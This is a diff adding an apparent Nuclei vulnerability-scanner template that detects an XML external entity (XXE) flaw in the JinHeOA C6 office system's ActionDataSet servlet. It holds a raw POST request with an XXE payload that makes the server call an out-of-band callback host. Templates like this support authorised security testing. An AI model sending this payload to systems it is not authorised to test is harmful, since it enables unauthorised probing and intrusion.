@@ -1,0 +1,33 @@
+id: JinHeOA_C6-ActionDataSet-XXE
+
+info:
+  name: JinHeOA_C6-ActionDataSet-XXE
+  author: iSee857
+  severity: high
+  description: |
+    JinHeOA_C6-ActionDataSet-XXE.
+  metadata:
+    verified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /jc6/servlet/ActionDataSet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
